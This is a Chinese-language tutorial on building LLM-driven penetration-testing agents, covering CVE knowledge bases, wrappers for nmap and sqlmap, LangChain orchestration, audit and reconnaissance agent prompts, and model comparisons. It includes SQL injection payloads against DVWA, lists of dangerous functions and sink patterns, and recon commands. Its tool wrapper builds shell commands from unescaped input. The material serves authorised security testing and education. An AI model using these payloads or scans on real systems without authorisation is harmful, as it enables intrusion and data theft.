【5.2 知识库构建】

  一、CVE/NVD 知识库 (结构化)

```python
#!/usr/bin/env python3
"""
构建 CVE 知识库
数据来源: NVD (National Vulnerability Database)
"""

import json
import sqlite3
import requests
from tqdm import tqdm

def download_nvd_data(year):
    """下载NVD年度数据"""
    url = f"https://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-{year}.json.gz"
    # 使用 requests 下载并解压
    pass

def build_vector_db():
    """构建向量数据库用于语义搜索"""
    from langchain_community.vectorstores import Chroma
    from langchain_openai import OpenAIEmbeddings

    embeddings = OpenAIEmbeddings()
    db = Chroma(
        persist_directory="/home/a/成长为一个红队/data/vectordb",
        embedding_function=embeddings
    )

    # 将 CVE 描述转为向量并存入数据库
    for cve in load_all_cves():
        doc = f"CVE: {cve['id']}\nSeverity: {cve['cvss']}\nDescription: {cve['description']}"
        db.add_texts([doc], metadatas=[{"cve_id": cve['id'], "cvss": cve['cvss']}])

    db.persist()
```

  二、Payload 知识库

  收集并索引常见 Payload:

  - PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
    (覆盖 SQLi, XSS, SSTI, SSRF, XXE, 命令注入, 文件包含等)
  - SecLists: https://github.com/danielmiessler/SecLists
    (包含各种 Fuzzing 字典)
  - FuzzDB: https://github.com/fuzzdb-project/fuzzdb
    (攻击模式和响应模式)

  三、攻击技术知识库

  - MITRE ATT&CK: https://attack.mitre.org
    技术矩阵 (Tactics, Techniques, Procedures)
    按阶段组织: Recon → Initial Access → Execution → Persistence → ...

  - OWASP Testing Guide v4/v5
    覆盖 Web 应用测试的完整生命周期

  - HackTricks: https://book.hacktricks.xyz
    渗透测试技术百科全书

  - LOLBAS / GTFOBins
    利用系统自带二进制文件进行攻击

【5.3 工具集成层 (Function Calling)】

```python
#!/usr/bin/env python3
"""
工具集成层: 将安全工具封装为 LLM 可调用的 Function
使用 OpenAI/Anthropic 的 Function Calling / Tool Use 能力
"""

TOOLS_DEFINITION = [
    {
        "name": "run_nmap_scan",
        "description": "使用 nmap 对目标进行端口扫描",
        "parameters": {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "目标 IP 或域名"},
                "ports": {"type": "string", "description": "端口范围 (如 1-1000, 或 22,80,443)", "default": "top-1000"},
                "timing": {"type": "string", "enum": ["T1", "T2", "T3", "T4", "T5"], "default": "T4"},
                "scripts": {"type": "string", "description": "NSE脚本 (如 vuln,default)", "default": "default"}
            },
            "required": ["target"]
        }
    },
    {
        "name": "run_sqlmap",
        "description": "使用 sqlmap 检测和利用 SQL 注入漏洞 (仅用于检测!)",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "目标 URL (包含参数)"},
                "technique": {"type": "string", "enum": ["U", "B", "T", "S", "E"], "description": "注入技术: U=Union, B=Boolean, T=Time, S=Stacked, E=Error"},
                "level": {"type": "integer", "minimum": 1, "maximum": 5, "default": 1},
                "only_detect": {"type": "boolean", "description": "仅检测不利用", "default": True}
            },
            "required": ["url"]
        }
    },
    {
        "name": "run_nuclei_scan",
        "description": "使用 Nuclei 对目标进行漏洞扫描",
        "parameters": {
            "type": "object",
            "properties": {
                "targets": {"type": "array", "items": {"type": "string"}, "description": "目标列表 (URL/IP)"},
                "severity": {"type": "array", "items": {"type": "string"}},
                "templates_dir": {"type": "string", "description": "模板目录路径"}
            },
            "required": ["targets"]
        }
    },
    {
        "name": "run_ffuf_fuzz",
        "description": "使用 ffuf 进行 Web 目录/文件 Fuzzing",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "目标 URL (FUZZ 占位符标记位置)"},
                "wordlist": {"type": "string", "description": "字典路径"},
                "extensions": {"type": "array", "items": {"type": "string"}, "description": "文件扩展名"},
                "match_codes": {"type": "array", "items": {"type": "integer"}, "description": "匹配的状态码"}
            },
            "required": ["url", "wordlist"]
        }
    },
    {
        "name": "search_cve_database",
        "description": "在本地 CVE 知识库中搜索漏洞信息",
        "parameters": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "搜索关键词"},
                "software": {"type": "string", "description": "软件名称过滤"},
                "version": {"type": "string", "description": "版本号过滤"},
                "severity_min": {"type": "number", "description": "最低 CVSS 分数 (0-10)"},
                "limit": {"type": "integer", "default": 10}
            },
            "required": ["query"]
        }
    },
    {
        "name": "search_exploit_db",
        "description": "搜索 Exploit-DB 中的利用代码",
        "parameters": {
            "type": "object",
            "properties": {
                "query": {"type": "string", "description": "搜索关键词或 CVE 编号"},
                "platform": {"type": "string", "enum": ["windows", "linux", "macos", "web", "multiple"]}
            },
            "required": ["query"]
        }
    }
]

def execute_tool(name: str, params: dict) -> str:
    """工具执行调度器"""
    import subprocess

    if name == "run_nmap_scan":
        cmd = f"nmap -{params.get('timing', 'T4')} -sV "
        if params.get('scripts'):
            cmd += f"--script {params['scripts']} "
        cmd += f"-p {params.get('ports', 'top-1000')} {params['target']}"
        return subprocess.getoutput(cmd)

    elif name == "run_sqlmap":
        url = params['url']
        technique = params.get('technique', '')
        level = params.get('level', 1)
        only_detect = params.get('only_detect', True)

        cmd = f"sqlmap -u '{url}' --batch --random-agent --level={level}"
        if technique:
            cmd += f" --technique={technique}"
        if only_detect:
            cmd += " --dbs"  # 仅枚举数据库，不执行更危险的操作
        return subprocess.getoutput(cmd)

    # ... 其他工具的实现

    return f"Unknown tool: {name}"
```

【5.4 编排层 (LangChain / AutoGPT 方式)】

```python
#!/usr/bin/env python3
"""
基于 LangChain 的挖洞 Agent 编排
"""

from langchain_openai import ChatOpenAI
from langchain.agents import AgentExecutor, create_tool_calling_agent
from langchain.tools import StructuredTool
from langchain_core.prompts import ChatPromptTemplate
import subprocess, json

# 1. 初始化 LLM
llm = ChatOpenAI(
    model="gpt-4o",
    temperature=0.1,  # 低温度，确保一致性
    max_tokens=4096
)

# 2. 封装工具
def nmap_scan(target: str, ports: str = "top-1000") -> str:
    """使用 nmap 扫描目标"""
    result = subprocess.getoutput(f"nmap -T4 -sV -p {ports} {target}")
    return result

def sqlmap_check(url: str) -> str:
    """检测 SQL 注入漏洞 (仅检测)"""
    result = subprocess.getoutput(
        f"sqlmap -u '{url}' --batch --level=1 --risk=1 --dbs 2>&1 | head -200"
    )
    return result

def search_cve(query: str, limit: int = 5) -> str:
    """搜索 CVE 数据库"""
    # 从本地 SQLite 数据库查询
    import sqlite3
    conn = sqlite3.connect("/home/a/成长为一个红队/data/cve.db")
    rows = conn.execute(
        "SELECT cve_id, description, cvss_score FROM cves "
        "WHERE description LIKE ? OR cve_id LIKE ? "
        "ORDER BY cvss_score DESC LIMIT ?",
        (f"%{query}%", f"%{query}%", limit)
    ).fetchall()
    conn.close()
    return json.dumps([{"id": r[0], "desc": r[1][:200], "cvss": r[2]} for r in rows], indent=2)

# 3. 注册工具
tools = [
    StructuredTool.from_function(func=nmap_scan),
    StructuredTool.from_function(func=sqlmap_check),
    StructuredTool.from_function(func=search_cve),
]

# 4. 定义 System Prompt (安全专家)
system_prompt = """你是一个专业的渗透测试助手，正在执行授权的安全评估。

工作原则:
1. 只测试明确授权的目标
2. 先被动收集信息，再逐步深入
3. 每步操作前评估风险
4. 发现漏洞后优先做无害验证
5. 生成结构化的测试报告

当你发现一个运行中的服务时:
1. 先搜索该服务的已知CVE
2. 如果存在相关CVE，评估利用条件
3. 执行最小化验证 (仅确认漏洞存在)
4. 报告漏洞信息和修复建议

不要:
- 执行破坏性操作 (DROP, DELETE, 文件删除等)
- 上传 webshell 或后门
- 扫描非授权目标
- 在不安全的环境下执行利用代码"""

prompt = ChatPromptTemplate.from_messages([
    ("system", system_prompt),
    ("human", "{input}"),
    ("placeholder", "{agent_scratchpad}")
])

# 5. 创建 Agent
agent = create_tool_calling_agent(llm, tools, prompt)
executor = AgentExecutor(
    agent=agent,
    tools=tools,
    verbose=True,
    max_iterations=15,
    handle_parsing_errors=True
)

# 6. 使用 Agent
if __name__ == "__main__":
    response = executor.invoke({
        "input": "对 testphp.vulnweb.com 执行安全评估，先做信息收集和端口扫描"
    })
    print(response["output"])
```

【5.5 方案三的优势与劣势】

  优势:
     完全自主可控 (模型、工具、数据全自选)
     可用本地模型保护隐私 (Llama 3, Qwen, DeepSeek-Coder)
     知识库可深度定制 (加入内部漏洞库、公司编码规范)
     工具集成无限制 (Function Calling 可封装任何命令)
     成本可控 (本地模型免费，API模型按使用量付费)

  劣势:
     开发工作量大 (需要自己写大量代码)
     维护成本高 (知识库更新、工具适配)
     本地模型能力有限 (代码审计能力不如 Claude)
     RAG 质量依赖向量化和检索策略调优

## 六、实践: 搭建一个代码审计Agent (完整实战)

【6.1 环境准备】

  本实战使用 Arch Linux + opencode + Claude:

```bash
# 1. 安装 opencode
yay -S opencode

# 2. 配置 Claude API Key
export ANTHROPIC_API_KEY="sk-ant-xxxxx"

# 3. 创建项目目录
mkdir -p ~/security-audit-agent
cd ~/security-audit-agent

# 4. 初始化 opencode 配置
opencode init

# 5. 下载测试用漏洞代码 (DVWA)
git clone https://github.com/digininja/DVWA.git targets/DVWA

# 6. 下载 WebGoat (更复杂的测试目标)
git clone https://github.com/WebGoat/WebGoat.git targets/WebGoat
```

【6.2 编写 AGENTS.md — 安全审计角色定义】

  `~/security-audit-agent/AGENTS.md`:

```markdown
# AGENTS.md for Red Team Code Review Agent

你是一个专业的源代码安全审计 Agent，专注于发现 Web 应用中的安全漏洞。

## 核心能力

你具备以下安全审计能力:
1. **数据流追踪**: 从用户输入点 (Source) 到危险函数 (Sink) 的完整路径分析
2. **模式识别**: 识别常见安全漏洞的代码模式
3. **上下文分析**: 在完整代码上下文 (非孤立片段) 中评判漏洞
4. **利用思路**: 对每个发现的漏洞构思可能的利用方法
5. **修复建议**: 提供可操作的、具体的修复方案

## 审计方法

对每个代码文件，系统化地执行以下检查:

### Check 1: 识别攻击面
- [ ] 找到所有接收外部输入的函数和参数
- [ ] 列出所有 API 端点及其参数
- [ ] 识别所有的认证/授权检查点
- [ ] 找到所有涉及敏感操作的代码 (数据库、文件系统、命令执行、加密)

### Check 2: 输入验证
- [ ] 外部输入是否有类型验证？
- [ ] 是否存在白名单验证？
- [ ] 文件上传是否检查内容类型和大小？
- [ ] 是否存在输入长度限制？

### Check 3: 注入漏洞
- [ ] SQL: 是否使用 Prepared Statement / ORM 参数绑定？
- [ ] Command: 用户输入是否出现在 os.system() / exec() / subprocess 中？
- [ ] XSS: 输出到 HTML 的内容是否经过转义？
- [ ] SSRF: 用户可控的 URL 是否被服务端直接请求？
- [ ] SSTI: 模板变量是否可能包含用户输入？
- [ ] LDAP/XPath/NoSQL: 是否有相应的注入防护？

### Check 4: 认证与授权
- [ ] 密码是否使用 bcrypt/argon2 哈希？
- [ ] 是否存在硬编码的凭证或密钥？
- [ ] Session / JWT Token 的生成和验证是否正确？
- [ ] 每个 API 端点是否都有权限检查 (而非仅前端检查)？
- [ ] 是否存在 IDOR (直接对象引用) 漏洞？

### Check 5: 配置与部署
- [ ] Debug 模式是否在生产环境关闭？
- [ ] 错误信息是否包含敏感的堆栈跟踪信息？
- [ ] 是否暴露了版本号、框架信息？
- [ ] CORS 配置是否过于宽松？
- [ ] 安全相关的 HTTP 头是否配置？(CSP, HSTS, X-Frame-Options)

### Check 6: 敏感数据
- [ ] 日志中是否记录了密码/Token/PII？
- [ ] 敏感数据是否使用 HTTPS 传输？
- [ ] 内存中的密钥是否及时清理？
- [ ] 备份文件是否可被外部访问？

### Check 7: 依赖安全
- [ ] 检查所有第三方库的版本
- [ ] 是否存在已知的 CVE (根据依赖版本查询 CVE 数据库)
- [ ] 是否使用了已不再维护的库？

## 漏洞严重程度判定

使用 CVSS 3.1 的判定思路:

| 严重程度 | 条件 |
|---------|------|
|  严重 (9.0-10.0) | 无需认证即可 RCE / 任意文件读取 / 未授权访问核心数据 |
|  高危 (7.0-8.9) | 需要低权限认证的 RCE / SQL注入 / 任意文件上传 |
|  中危 (4.0-6.9) | XSS, CSRF, SSRF (受限), 信息泄露 |
|  低危 (0.1-3.9) | 配置问题 (无直接利用价值) / 理论上的风险 |

## 输出格式

对每个漏洞发现，使用以下格式:

` ` `
### 漏洞 #N: [简短描述]

| 属性 | 值 |
|------|-----|
| **严重程度** | /// |
| **文件** | `path/to/file.ext:行号` |
| **类型** | CWE-XXX / OWASP分类 |
| **CVSS** | X.X (AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X) |

**危险代码**:
` ` `[语言]
// 显示具体的危险代码片段，标注行号
` ` `

**数据流分析**:
  Source (用户输入) → [sanitization?] → [validation?] → Sink (危险函数)

**利用条件**:
  - [条件1]
  - [条件2]

**利用方法 (思路)**:
  1. [利用步骤1]
  2. [利用步骤2]

**修复方案**:
  1. **[方案1 — 推荐]**: 具体代码修改示例
  2. **[方案2 — 备选]**: 替代方案
` ` `

## 语言特定的危险函数速查表

### Python
- `os.system()`, `os.popen()`, `subprocess.call(shell=True)` — 命令注入
- `eval()`, `exec()`, `compile()` — 代码注入
- `pickle.loads()`, `yaml.load()` — 不安全反序列化
- `sqlite3.execute(f"SELECT * FROM {table}")` — SQL注入
- `jinja2.Template(user_input).render()` — SSTI
- `urllib.request.urlopen(user_url)` — SSRF

### PHP
- `system()`, `exec()`, `passthru()`, `shell_exec()`, 反引号 `` ` `` — 命令注入
- `unserialize()` — 不安全反序列化
- `include $user_input`, `require $_GET['page']` — LFI/RFI
- `mysql_query("SELECT * FROM users WHERE id=" . $_GET['id'])` — SQL注入
- `eval()`, `assert()`, `preg_replace('/.*/e', ...)` — 代码执行
- `extract()`, `parse_str()` — 变量覆盖

### Java
- `Runtime.getRuntime().exec(userInput)` — 命令注入
- `Statement.executeQuery("SELECT * FROM " + userInput)` — SQL注入
- `ObjectInputStream.readObject()` — 不安全反序列化
- `InitialContext.lookup(userInput)` — JNDI注入 (Log4Shell)
- `ProcessBuilder pb = new ProcessBuilder(userInput)` — 命令注入
- `javax.script.ScriptEngine.eval(userInput)` — 代码注入

### JavaScript / Node.js
- `eval()`, `new Function()`, `setTimeout(string)`, `setInterval(string)` — 代码注入
- `child_process.exec("ls " + userInput)` — 命令注入
- `vm.runInNewContext(userInput)` — 沙箱逃逸
- `JSON.parse()` + `__proto__` — 原型污染
- `MongoDB: collection.find({ $where: userInput })` — NoSQL注入
- `require(userInput)` — 动态加载 (LFI)
```

【6.3 编写 Skill — 系统化审计检查清单】

  `.opencode/skills/security-review.md`:

```markdown
# Skill: Security Code Review

调用此 Skill 时，对目标代码库执行系统化安全审计。

## Phase 0: 项目概览
1. 列出项目目录结构
2. 识别主要编程语言和框架
3. 识别第三方依赖
4. 总结攻击面概况

## Phase 1: 认证与授权 (最高优先级)
这是最常见也是最致命的漏洞来源。

检查要点:
- 登录逻辑: 是否有验证码/速率限制/账户锁定？
- Session 管理: Token 是否随机？是否有超时？登出是否真正销毁Session？
- JWT: 是否验证签名？是否检查过期？alg=none 攻击？
- 密码重置: 是否可以被猜解？Token 是否可预测？
- API 授权: 每个端点是否都有权限检查？(不是只有前端检查！)
- 角色模型: 低权限用户能否访问管理功能？
- IDOR: 修改资源ID参数能否访问他人数据？

## Phase 2: 注入漏洞
逐一检查每种注入类型:

### SQL注入
检查所有数据库查询语句:
  - 是否使用 Prepared Statement / 参数绑定？
  - ORM 查询中是否有动态拼接？
  - 存储过程是否安全？

搜索模式 (grep):
  "SELECT.*" +
  "INSERT.*" +
  "UPDATE.*" +
  f"SELECT * FROM {table}"
  "exec sp_executesql"

### 命令注入
检查所有系统命令调用:
  - 用户输入是否直接拼接到命令字符串？
  - shell=True 是否使用？
  - 是否使用 shlex.quote() / escapeshellarg() 进行转义？

搜索模式:
  os.system(
  subprocess.call(
  exec(
  passthru(
  shell_exec(
  `...`

### XSS
检查输出到 HTML 的代码:
  - 是否使用模板引擎的自动转义？
  - innerHTML / document.write() 的内容是否来自用户？
  - CSP 头是否配置？

搜索模式:
  innerHTML
  document.write(
  dangerouslySetInnerHTML
  {% autoescape off %}

### SSRF
检查服务端发起 HTTP 请求的代码:
  - 目标 URL 是否可由用户控制？
  - 是否有 URL 白名单？
  - 是否过滤了内网地址？(127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)

搜索模式:
  urlopen(
  requests.get(
  curl_setopt
  HttpURLConnection
  axios.get(

## Phase 3: 文件操作
- 路径遍历: 用户输入是否影响文件路径？是否有 ../ 过滤？
- 文件上传: 是否检查文件类型、内容、大小？是否重命名？
- 任意文件读取: 是否有路径限制？符号链接？

## Phase 4: 加密与密钥
- 密钥/密码: 是否硬编码？(grep: "password|secret|api_key|private_key|token")
- 加密算法: 是否使用 AES-GCM / ChaCha20 (而非 ECB/CBC without HMAC)？
- 哈希: 密码是否使用 bcrypt/argon2？
- 随机数: 是否使用密码学安全的随机数生成器？

## Phase 5: 配置审计
- .env / .gitignore: 是否包含敏感文件？
- Dockerfile: 是否以 root 运行？是否有不必要的端口暴露？
- nginx/apache 配置: 是否有不安全的配置？
- CI/CD 配置: 是否泄露密钥？

## Phase 6: 依赖安全
1. 提取所有依赖及版本
2. 对每个依赖，在 CVE 数据库中搜索已知漏洞
3. 报告所有存在已知漏洞的依赖
4. 建议升级到安全版本
```

【6.4 实战: 审计一个真实的漏洞代码】

  以下展示 opencode 在审计代码时的实际输出效果:

  **用户输入**:
  ```
  @red-team 审计 targets/DVWA/vulnerabilities/sqli/source/low.php
  ```

  **Agent 输出**:

```
## 安全审计报告: DVWA SQL注入 (Low难度)

### 漏洞 #1: SQL注入 — 完全无防护的直接拼接

| 属性 | 值 |
|------|-----|
| **严重程度** |  高危 (7.5) |
| **文件** | `targets/DVWA/vulnerabilities/sqli/source/low.php:3-15` |
| **类型** | CWE-89 SQL注入 / OWASP A03:2021 |
| **CVSS** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |

**危险代码**:
```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];       // ← Source: 完全未过滤
                                     //    ↓ 无 sanitization
                                     //    ↓ 无 validation
    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
                                     // ← Sink: 直接拼接到 SQL 语句
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    // ... 显示结果
}
?>
```

**数据流分析**:
```
$_REQUEST[ 'id' ]  (无过滤)>  $id  (字符串拼接)>  $query  (mysqli_query)>  Database
    ↑ Source                                                             ↑ Sink
    用户输入                                                     SQL 查询执行
```

**利用条件**:
- 无需认证 (Low难度)
- 目标: DVWA 的 SQL Injection 页面
- 数据库用户有查询权限

**利用方法 (思路)**:
1. 闭合单引号: `1'`
2. 绕过认证: `1' OR '1'='1`
3. UNION注入获取数据: `1' UNION SELECT user, password FROM users-- -`
4. 提取数据:
   ```
   # 获取所有用户
   1' UNION SELECT user, password FROM users-- -
   # 获取数据库名
   1' UNION SELECT database(), user()-- -
   # 获取表名
   1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -
   ```

**修复方案**:

1. **[推荐] 使用 Prepared Statement (参数化查询)**:
```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    $id = $_REQUEST[ 'id' ];
    
    // 使用 Prepared Statement
    $stmt = mysqli_prepare($GLOBALS["___mysqli_ston"],
        "SELECT first_name, last_name FROM users WHERE user_id = ?");
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    $result = mysqli_stmt_get_result($stmt);
    // ... 显示结果
}
?>
```

2. **[备选] 输入验证 + 转义 (不推荐作为唯一方案)**:
```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    $id = $_REQUEST[ 'id' ];
    
    // 验证输入是数字
    if (!is_numeric($id)) {
        die("Invalid user ID");
    }
    $id = intval($id);  // 强制转换为整数
    
    $query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
    // ...
}
?>
```

**安全要点**:
- Prepared Statement 是 SQL 注入的终极解决方案
- 永远不要信任用户输入，永远不要直接拼接到 SQL 语句
- 仅在 Prepared Statement 不可用时，使用输入验证 + 严格类型转换
```

【6.5 使用 opencode 批量审计实战技巧】

```bash
# 1. 审计单个文件
opencode "审计 targets/DVWA/vulnerabilities/sqli/source/low.php 的安全漏洞"

# 2. 审计整个目录
opencode "审计 targets/WebGoat/src/main/java/org/owasp/webgoat/lessons/ 下所有Java代码，
  重点关注 SQL注入、命令注入、SSRF、XXE 漏洞"

# 3. 结合关键词搜索审计
opencode "在 target项目中搜索所有使用 exec(、eval(、os.system( 的代码，
  分析每个调用是否存在命令注入风险"

# 4. 审计配置文件
opencode "审计 target项目中的所有配置文件 (.env, config.php, settings.py, application.properties)，
  查找硬编码密钥、不安全默认配置、Debug模式开启等问题"

# 5. 依赖安全审计
opencode "审计 target项目中的 requirements.txt / package.json / pom.xml，
  检查所有依赖版本，搜索已知 CVE 漏洞"

# 6. 对比安全版本
opencode "对比 targets/old-version/ 和 targets/new-version/ 的差异，
  分析安全修复是否正确，是否有引入新的安全问题"
```

## 七、实践: 搭建一个侦察Agent (完整实战)

【7.1 侦察Agent的设计理念】

  侦察是渗透测试中最繁琐的环节，但也是AI Agent最能发挥价值的环节。
  一个好的侦察Agent应该:

  1. **自主执行**: 给定一个目标域名，自动完成标准侦察流程
  2. **节奏可控**: 使用合理的扫描速率，避免触发WAF/IDS
  3. **结果结构化**: 输出标准化的侦察报告，便于人工分析
  4. **智能过滤**: 自动去重、排序、标注重点

【7.2 AGENTS.md 配置 — 侦察角色】

  `~/security-audit-agent/AGENTS-recon.md`:

```markdown
# AGENTS.md for Reconnaissance Agent

你是一个专业的渗透测试侦察 Agent，负责对授权目标执行系统化信息收集。

## 侦察目标
1. 发现所有与目标相关的网络资产 (子域名、IP段、关联域名)
2. 识别存活服务和开放端口
3. 确定技术栈和版本信息
4. 发现可能的攻击入口点
5. 生成可操作的结构化侦察报告

## 行为准则
- **被动优先**: 先使用不直接与目标交互的被动方式收集信息
- **低频慢速**: 主动扫描时使用合理的速率限制 (--delay, --rate-limit)
- **范围控制**: 严格遵守用户指定的侦察范围
- **结果确认**: 关键发现要交叉验证，避免误报
- **操作记录**: 记录所有执行的命令、时间戳、结果

## 侦察流程

### Stage 1: 被动信息收集 (约5分钟)
使用以下被动技术，不产生直接交互:

1. WHOIS 查询:
   whois {target_domain}

2. DNS 记录:
   dig ANY {target_domain}
   dig A {target_domain}
   dig MX {target_domain}
   dig NS {target_domain}
   dig TXT {target_domain}

3. 证书透明度 (CT Logs):
   curl -s "https://crt.sh/?q=%25.{target_domain}&output=json" | jq -r '.[].name_value' | sort -u

4. SSL 证书信息:
   openssl s_client -connect {target_domain}:443 -servername {target_domain} 2>/dev/null | openssl x509 -noout -text

5. 搜索引擎 Dorking (手工):
   site:{target_domain}
   site:{target_domain} filetype:pdf
   site:{target_domain} inurl:admin
   site:github.com {target_domain}

### Stage 2: 子域名枚举 (约10分钟)
使用多种工具交叉验证:

1. 证书透明度 (已执行)
2. DNS暴力枚举:
   subfinder -d {target_domain} -all -o subfinder_results.txt
3. 被动API查询:
   amass enum -passive -d {target_domain} -o amass_results.txt
4. DNS验证:
   cat *_results.txt | sort -u > all_subs.txt
   puredns resolve all_subs.txt -r 8.8.8.8,1.1.1.1 | tee resolved.txt

### Stage 3: 存活验证与指纹 (约10分钟)
检查哪些资产存活，以及它们的Web技术栈:

1. HTTP/S 探测:
   cat resolved.txt | httpx -title -status-code -tech-detect -follow-redirects \
     -o alive_http.txt

2. 截图 (可选):
   cat alive_http.txt | gowitness file -f -

3. Web 指纹:
   whatweb --no-errors -i alive_http.txt | tee whatweb_results.txt

### Stage 4: 端口扫描 (约20分钟)
分层扫描:

1. 快速端口扫描 (Top 1000):
   naabu -list resolved.txt -top-ports 1000 -o naabu_quick.txt

2. 服务版本检测 (针对存活端口):
   nmap -sV -sC -iL naabu_quick.txt -oA service_scan

3. 关键目标全端口 (仅对核心目标):
   nmap -sV -sC -p- -T4 {critical_target} -oA full_port_scan

### Stage 5: Web路径发现 (约15分钟)
对Web服务进行目录/文件枚举:

1. 目录Fuzzing:
   ffuf -w ~/wordlists/raft-medium-directories.txt \
     -u https://{target}/FUZZ -ac -t 50 -o ffuf_dirs.json

2. 文件Fuzzing:
   ffuf -w ~/wordlists/raft-medium-files.txt \
     -u https://{target}/FUZZ -ac -t 50 -o ffuf_files.json

3. 备份文件检查:
   ffuf -w ~/wordlists/backup-extensions.txt \
     -u https://{target}/indexFUZZ -ac -t 50

### Stage 6: 漏洞快速扫描 (约10分钟)
使用Nuclei进行快速漏洞扫描:

1. 严重+高危漏洞:
   nuclei -list alive_http.txt \
     -severity critical,high \
     -o nuclei_critical.txt

2. 全量扫描 (时间允许):
   nuclei -list alive_http.txt \
     -severity critical,high,medium \
     -o nuclei_all.txt

### Stage 7: 报告生成
整理所有发现，生成标准侦察报告。

## 侦察报告模板

` ` `
# 侦察报告

## 目标信息
- **主域名**: example.com
- **侦察日期**: YYYY-MM-DD
- **侦察范围**: *.example.com, 关联IP段
- **授权状态**: 已获得书面授权

## 资产发现汇总
| 类别 | 数量 |
|------|------|
| 发现子域名 | XX |
| 存活子域名 | XX |
| 开放端口 (去重) | XX |
| Web服务 | XX |
| 其他服务 | XX |

## 存活资产详情
| 子域名 | IP地址 | 开放端口 | Web技术栈 | HTTP状态 | 页面标题 |
|--------|--------|----------|-----------|----------|----------|
| ...    | ...    | ...      | ...       | ...      | ...      |

## 攻击面分析

### 外部暴露的服务
- [高危] 端口 22 (SSH): X个子域名
- [中危] 端口 3306 (MySQL): X个子域名
- [注意] 端口 8443 (管理后台): admin.example.com

### 过时技术栈
- Apache 2.4.6 (2013年版本) — CVE-2021-41773
- jQuery 1.12.4 — 多个已知XSS漏洞
- PHP 5.6.40 — 已停止支持

### 敏感信息泄露
- robots.txt 暴露管理路径: /admin, /backup
- 错误页面泄露框架版本
- .git 目录可访问: repository.example.com/.git/

## 优先级建议
1.  高危: admin.example.com (Apache 2.4.6 + 管理后台)
2.  高危: api.example.com (暴露的API端点)
3.  高危: repository.example.com (.git泄露)
4.  中危: 开放数据库端口 (3306, 5432)
5.  低危: 信息泄露 (版本号, robots.txt)

## 下一步建议
- [ ] 对 admin.example.com 进行深入Web渗透测试
- [ ] 检查 .git 泄露中是否包含凭证/密钥
- [ ] 测试 API 端点的认证和授权
- [ ] 尝试利用 Apache CVE-2021-41773
` ` `
```

【7.3 使用侦察Agent】

```bash
# 设置侦察 Agent
opencode --agent agents/recon.md

# 执行侦察
opencode "对 example.com 执行完整侦察，按照 AGENTS.md 中的流程执行所有阶段"

# 指定范围的侦察
opencode "对 example.com 执行侦察，但仅限子域名枚举和端口扫描，不要做Web路径发现"

# 针对特定IP段
opencode "对 192.168.1.0/24 网段执行主机发现和端口扫描"

# 从侦察报告继续测试
opencode "根据侦察报告中的发现，对 admin.example.com 的 Apache 2.4.6 进行漏洞验证"
```

## 八、模型选择与对比

【8.1 不同安全任务的最佳模型】

```

  安全任务             | 推荐模型        | 理由                    |

  代码审计 (精确)      | Claude 4        | 最强的代码理解和逻辑推理 |
  代码审计 (快速初筛)  | GPT-4o          | 速度快，适合大项目初筛  |
  PoC 编写             | Claude 4        | 代码生成质量最高        |
  漏洞分析报告         | Claude 4        | 结构化输出好            |
  侦察报告生成         | GPT-4o          | 格式美观，中文表达好    |
  中文安全文档阅读     | DeepSeek-V3     | 中文理解力强，开源      |
  隐私敏感任务         | 本地模型        | 数据不出本机            |
  网络协议分析         | Claude 4/GPT-4o | 需要强推理能力          |
  批量模式匹配         | 本地模型/脚本   | 速度优先，无需强推理    |

```

【8.2 各模型详细评估】

  一、Claude (Anthropic) — 
  
  模型: Claude Opus 4 / Claude Sonnet 4

  安全领域优势:
     代码理解能力业界最强
     擅长发现逻辑漏洞 (而非仅模式匹配)
     系统提示词遵循度高，少幻觉
     长上下文 (200K tokens) 适合大型代码库审计
     工具使用 (Tool Use / MCP) 成熟

  安全领域劣势:
     API 价格较高 (Opus: $15/$75 per 1M tokens)
     中文能力略逊 GPT-4
     有时过于谨慎，需要明确指令才执行安全操作

  适用场景:
    → 深度代码审计
    → 复杂漏洞的利用链分析
    → 需要长上下文的安全分析

  二、GPT-4 (OpenAI) — 
  
  模型: GPT-4o / GPT-4 Turbo

  安全领域优势:
     综合能力强，覆盖面广
     中文能力出色
     生态最成熟 (LangChain等框架首选)
     响应速度快 (GPT-4o)

  安全领域劣势:
     代码深层次理解不如 Claude
     偶尔会产生过于自信的错误分析
     API价格波动

  适用场景:
    → 侦察报告生成
    → 安全文档分析
    → 需要中文输出的场景

  三、DeepSeek — 
  
  模型: DeepSeek-V3 / DeepSeek-Coder-V2

  安全领域优势:
     开源，可本地部署
     中文理解力最强
     代码能力接近 GPT-4
     价格极低 (API)

  安全领域劣势:
     工具使用/MCP 集成不如 Claude 成熟
     指令遵循度有时不稳定
     上下文长度有限

  适用场景:
    → 中文安全文档分析
    → 本地部署的隐私敏感审计
    → 成本敏感的大规模分析

  四、本地模型 (Llama/Qwen/DeepSeek-Coder) — 
  
  模型: Llama 3 70B / Qwen 2.5 72B / DeepSeek-Coder-V2

  安全领域优势:
     完全本地运行，零隐私风险
     无 API 费用
     可 Fine-tune (微调) 安全领域知识
     离线可用

  安全领域劣势:
     审计能力弱于闭源模型
     复杂漏洞分析效果有限
     需要高性能 GPU (至少 24GB+ VRAM)

  适用场景:
    → 高度敏感的目标代码 (如军工、金融)
